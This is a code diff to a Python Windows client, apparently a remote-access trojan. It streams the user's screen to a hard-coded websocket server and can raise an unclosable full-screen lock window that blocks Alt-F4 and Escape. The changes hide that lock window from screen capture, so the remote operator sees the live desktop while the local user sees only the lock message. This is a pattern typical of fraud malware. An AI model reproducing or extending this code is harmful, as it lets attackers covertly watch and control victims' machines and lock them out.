@@ -11,14 +11,14 @@ import ctypes
 import ssl
 import sys
 from io import BytesIO
+from ctypes import wintypes
 
-import mss
 from PIL import Image
 import pyautogui
 import pyperclip
 
 SERVER_URL = "wss://web-production-9d7cc.up.railway.app"
-FRAME_INTERVAL = 0.033
+FRAME_INTERVAL = 0.05
 QUALITY = 70
 SCALE = 0.75
 
@@ -35,7 +35,7 @@ ws_app = None
 running = True
 screen_locked = False
 lock_thread = None
-lock_window = None
+lock_hwnd = None
 
 
 def set_console_title(title):
@@ -138,7 +138,7 @@ def get_system_info():
 # ============================================
 
 def show_lock_screen(message):
-    global screen_locked, lock_thread, lock_window
+    global screen_locked, lock_thread, lock_hwnd
 
     if screen_locked:
         return
@@ -146,12 +146,11 @@ def show_lock_screen(message):
     screen_locked = True
 
     def run_lock_window():
-        global screen_locked, lock_window
+        global screen_locked, lock_hwnd
         try:
             import tkinter as tk
 
             root = tk.Tk()
-            lock_window = root
             root.title("")
 
             screen_width = root.winfo_screenwidth()
@@ -165,6 +164,16 @@ def show_lock_screen(message):
             root.protocol("WM_DELETE_WINDOW", lambda: None)
             root.bind('<Alt-F4>', lambda e: 'break')
             root.bind('<Escape>', lambda e: 'break')
+
+            # Aplicar WDA_EXCLUDEFROMCAPTURE
+            root.update()
+            try:
+                hwnd = ctypes.windll.user32.GetParent(root.winfo_id())
+                lock_hwnd = hwnd
+                WDA_EXCLUDEFROMCAPTURE = 0x00000011
+                ctypes.windll.user32.SetWindowDisplayAffinity(hwnd, WDA_EXCLUDEFROMCAPTURE)
+            except:
+                pass
 
             frame = tk.Frame(root, bg='#000000')
             frame.place(relx=0.5, rely=0.5, anchor='center')
@@ -182,19 +191,21 @@ def show_lock_screen(message):
             sub_label.pack(pady=15)
 
             def check_unlock():
-                global lock_window
+                global lock_hwnd
                 if not screen_locked:
-                    lock_window = None
+                    lock_hwnd = None
                     root.destroy()
                 else:
-                    root.after(100, check_unlock)
+                    root.lift()
+                    root.attributes('-topmost', True)
+                    root.after(200, check_unlock)
 
             check_unlock()
             root.mainloop()
 
         except:
             screen_locked = False
-            lock_window = None
+            lock_hwnd = None
 
     lock_thread = threading.Thread(target=run_lock_window, daemon=True)
     lock_thread.start()
@@ -206,74 +217,97 @@ def hide_lock_screen():
 
 
 # ============================================
-# CAPTURA DE TELA
+# CAPTURA DE TELA VIA GDI (BitBlt)
 # ============================================
 
-lock_hwnd = None
+def capture_screen_gdi():
+    """Captura tela via Windows GDI - respeita WDA_EXCLUDEFROMCAPTURE"""
+    user32 = ctypes.windll.user32
+    gdi32 = ctypes.windll.gdi32
 
-def get_lock_hwnd():
-    global lock_hwnd, lock_window
-    if lock_hwnd:
-        return lock_hwnd
-    if lock_window:
-        try:
-            lock_hwnd = ctypes.windll.user32.GetParent(lock_window.winfo_id())
-        except:
-            pass
-    return lock_hwnd
+    width = user32.GetSystemMetrics(0)
+    height = user32.GetSystemMetrics(1)
+
+    hdesktop = user32.GetDesktopWindow()
+    desktop_dc = user32.GetWindowDC(hdesktop)
+    img_dc = gdi32.CreateCompatibleDC(desktop_dc)
+
+    hbmp = gdi32.CreateCompatibleBitmap(desktop_dc, width, height)
+    gdi32.SelectObject(img_dc, hbmp)
+
+    # BitBlt com SRCCOPY
+    gdi32.BitBlt(img_dc, 0, 0, width, height, desktop_dc, 0, 0, 0x00CC0020)
+
+    # Extrair pixels
+    class BITMAPINFOHEADER(ctypes.Structure):
+        _fields_ = [
+            ('biSize', wintypes.DWORD),
+            ('biWidth', wintypes.LONG),
+            ('biHeight', wintypes.LONG),
+            ('biPlanes', wintypes.WORD),
+            ('biBitCount', wintypes.WORD),
+            ('biCompression', wintypes.DWORD),
+            ('biSizeImage', wintypes.DWORD),
+            ('biXPelsPerMeter', wintypes.LONG),
+            ('biYPelsPerMeter', wintypes.LONG),
+            ('biClrUsed', wintypes.DWORD),
+            ('biClrImportant', wintypes.DWORD),
+        ]
+
+    bmi = BITMAPINFOHEADER()
+    bmi.biSize = ctypes.sizeof(BITMAPINFOHEADER)
+    bmi.biWidth = width
+    bmi.biHeight = -height  # Top-down
+    bmi.biPlanes = 1
+    bmi.biBitCount = 32
+    bmi.biCompression = 0
+
+    buffer_size = width * height * 4
+    buffer = ctypes.create_string_buffer(buffer_size)
+
+    gdi32.GetDIBits(img_dc, hbmp, 0, height, buffer, ctypes.byref(bmi), 0)
+
+    # Limpar
+    gdi32.DeleteObject(hbmp)
+    gdi32.DeleteDC(img_dc)
+    user32.ReleaseDC(hdesktop, desktop_dc)
+
+    # Criar imagem PIL
+    img = Image.frombuffer('RGBA', (width, height), buffer, 'raw', 'BGRA', 0, 1)
+    return img.convert('RGB')
+
 
 def capture_screen():
     global panel_connected, running, current_quality, current_scale
 
-    user32 = ctypes.windll.user32
-    SWP_NOSIZE = 0x0001
-    SWP_NOZORDER = 0x0004
-    SWP_NOACTIVATE = 0x0010
-    HWND_TOPMOST = -1
+    while running:
+        if not panel_connected:
+            time.sleep(0.5)
+            continue
 
-    with mss.mss() as sct:
-        monitor = sct.monitors[1]
-        screen_w = monitor['width']
-        screen_h = monitor['height']
+        try:
+            img = capture_screen_gdi()
 
-        while running:
-            if not panel_connected:
-                time.sleep(0.5)
-                continue
+            new_width = int(img.width * current_scale)
+            new_height = int(img.height * current_scale)
+            img = img.resize((new_width, new_height), Image.LANCZOS)
 
-            try:
-                hwnd = get_lock_hwnd() if screen_locked else None
+            buffer = BytesIO()
+            img.save(buffer, format='JPEG', quality=current_quality, optimize=True)
+            frame_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
 
-                if hwnd:
-                    user32.SetWindowPos(hwnd, 0, -screen_w, 0, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE)
+            if ws_app and is_connected:
+                ws_app.send(json.dumps({
+                    "type": "screen-frame",
+                    "clientId": client_id,
+                    "frame": frame_data,
+                    "width": img.width,
+                    "height": img.height
+                }))
 
-                screenshot = sct.grab(monitor)
-
-                if hwnd:
-                    user32.SetWindowPos(hwnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOACTIVATE)
-
-                img = Image.frombytes('RGB', screenshot.size, screenshot.bgra, 'raw', 'BGRX')
-
-                new_width = int(img.width * current_scale)
-                new_height = int(img.height * current_scale)
-                img = img.resize((new_width, new_height), Image.LANCZOS)
-
-                buffer = BytesIO()
-                img.save(buffer, format='JPEG', quality=current_quality, optimize=True)
-                frame_data = base64.b64encode(buffer.getvalue()).decode('utf-8')
-
-                if ws_app and is_connected:
-                    ws_app.send(json.dumps({
-                        "type": "screen-frame",
-                        "clientId": client_id,
-                        "frame": frame_data,
-                        "width": img.width,
-                        "height": img.height
-                    }))
-
-                time.sleep(FRAME_INTERVAL)
-            except:
-                time.sleep(1)
+            time.sleep(FRAME_INTERVAL)
+        except Exception as e:
+            time.sleep(1)
 
 
 # ============================================
